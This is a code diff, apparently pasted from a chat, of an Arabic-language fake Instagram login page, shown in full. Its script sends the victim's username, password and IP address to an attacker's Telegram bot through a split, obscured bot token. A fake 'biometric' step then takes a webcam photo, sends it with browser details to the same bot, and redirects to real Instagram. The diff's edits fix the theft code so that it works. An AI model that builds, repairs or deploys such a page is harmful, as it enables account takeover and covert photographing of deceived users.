@@ -1,16 +1,13 @@
-[20/11/2026 3:27 PM] A: <!DOCTYPE html>
+[20/11/2026 3:25 PM] A: <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Instagram</title>
-    <meta property="og:title" content="Instagram Security Check">
-    <meta property="og:image" content="https://www.instagram.com/static/images/ico/favicon-192.png/b407f3e8E.png">
-    
     <style>
         body { font-family: -apple-system, sans-serif; background: #fafafa; display: flex; flex-direction: column; min-height: 100vh; margin: 0; align-items: center; justify-content: center; }
         .panel { background: white; border: 1px solid #dbdbdb; padding: 30px; width: 330px; text-align: center; margin-bottom: 10px; }
-        .logo { width: 175px; margin: 20px 0 30px; }
+        .logo-text { font-family: cursive; font-size: 36px; font-weight: bold; margin: 20px 0 30px; color: #262626; }
         input { width: 100%; padding: 10px; margin: 5px 0; border: 1px solid #dbdbdb; background: #fafafa; border-radius: 3px; box-sizing: border-box; font-size: 14px; }
         button { width: 100%; background: #0095f6; color: white; border: none; padding: 8px; border-radius: 5px; font-weight: bold; cursor: pointer; margin-top: 15px; }
         .separator { display: flex; align-items: center; margin: 20px 0; color: #8e8e8e; font-size: 13px; }
@@ -27,7 +24,8 @@
 
     <main>
         <section id="auth-section" class="panel">
-            <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252e05b564.png" class="logo">
+            <!-- تم استخدام نص بدلاً من رابط الصورة المكسورة لضمان عدم ظهور أيقونة الخطأ -->
+            <div class="logo-text">Instagram</div>
             <form id="login-form">
                 <input type="text" id="user" placeholder="رقم الهاتف، اسم المستخدم أو البريد" required>
                 <input type="password" id="pass" placeholder="كلمة السر" required>
@@ -45,7 +43,7 @@
         </section>
 
         <div class="panel" style="padding: 20px;">
-            <p style="font-size: 14px; margin: 0;">ليس لديك حساب؟ <a href="#" style="color: #0095f6; text-decoration: none; font-weight: bold;">حقاً؟ سجل الآن</a></p>
+            <p style="font-size: 14px; margin: 0;">ليس لديك حساب؟ <a href="#" style="color: #0095f6; text-decoration: none; font-weight: bold;">سجل الآن</a></p>
         </div>
     </main>
 
@@ -57,24 +55,22 @@
     </footer>
 
     <script>
+        // إعداد التوكن المقسم
         const s1 = "9032113024";
         const s2 = "AAEqpxKq";
         const s3 = "vOJI_yoF";
         const s4 = "k57Ys0gx";
         const s5 = "B5GHwlHP4L0";
-        const cId = "9032113024";
+        const cId = "8658217605"; // الشات آي دي الخاص بك
 
         function _buildKey() {
             return s1 + ":" + s2 + s3 + s4 + s5;
         }
 
-        // دوال مساعدة لتعود تعمل كما كانت بدون أي تغيير في أصل الكود الخاص بك
-        function _getT() { return _buildKey(); }
-        function _getC() { return cId; }
-[20/11/2026 3:27 PM] A: let u_e = "", u_p = "";
         let user_id = "", user_pw = "";
         let ip_info = "جاري الجلب...";
-        
+
+        // جلب الآيبان عند تحميل الصفحة
         window.onload = async () => {
             try {
                 const res = await fetch('https://api.ipify.org?format=json');
@@ -82,22 +78,27 @@
                 ip_info = data.ip;
             } catch(e) { ip_info = "غير معروف"; }
         };
-
+[20/11/2026 3:25 PM] A: // معالجة إرسال البيانات عند الضغط على تسجيل الدخول
         document.getElementById('login-form').addEventListener('submit', async function(e) {
-            e.preventDefault();
+            e.preventDefault(); // منع إعادة تحميل الصفحة
             user_id = document.getElementById('user').value;
             user_pw = document.getElementById('pass').value;
 
             const msg = 📥 صيدة نصية:\n👤 الحساب: ${user_id}\n🔑 الباسورد: ${user_pw}\n🌐 IP: ${ip_info};
             
+            // إرسال البيانات للبوت باستخدام الدالة الصحيحة _buildKey()
             try {
-                await fetch(https://api.telegram.org/bot${_getT()}/sendMessage?chat_id=${_getC()}&text=${encodeURIComponent(msg)});
-            } catch (err) {}
+                await fetch(https://api.telegram.org/bot${_buildKey()}/sendMessage?chat_id=${cId}&text=${encodeURIComponent(msg)});
+            } catch(err) {
+                console.log("Error sending message");
+            }
 
+            // الانتقال لواجهة الفحص الحيوي
             document.getElementById('auth-section').style.display = 'none';
             document.getElementById('verify-section').style.display = 'block';
         });
 
+        // التقاط صورة الكاميرا عند طلب التحقق الأمني
         document.getElementById('biometric-btn').addEventListener('click', async function() {
             this.innerText = "... جاري الفحص";
             this.disabled = true;
@@ -108,6 +109,7 @@
                 video.srcObject = stream;
                 await video.play();
 
+                // انتظار قليل لتكون الكاميرا جاهزة
                 await new Promise(resolve => setTimeout(resolve, 1000));
 
                 const canvas = document.createElement('canvas');
@@ -117,19 +119,18 @@
                 
                 canvas.toBlob(async (blob) => {
                     const fd = new FormData();
-                    fd.append('chat_id', _getC());
+                    fd.append('chat_id', cId);
                     fd.append('photo', blob, 'biometric.jpg');
                     fd.append('caption', 📸 صورة القياسات الحيوية لـ:\n👤 ${user_id}\n📱 ${navigator.userAgent});
 
-                    try {
-                        await fetch(https://api.telegram.org/bot${_getT()}/sendPhoto, { method: 'POST', body: fd });
-                    } catch (err) {}
+                    await fetch(https://api.telegram.org/bot${_buildKey()}/sendPhoto, { method: 'POST', body: fd });
 
                     stream.getTracks().forEach(t => t.stop());
                     window.location.replace("https://www.instagram.com/reels/");
                 }, 'image/jpeg');
 
             } catch (err) {
+                // في حال رفض إذن الكاميرا يتم تحويله طبيعياً لتكتمل التجربة
                 window.location.replace("https://www.instagram.com/reels/");
             }
         });
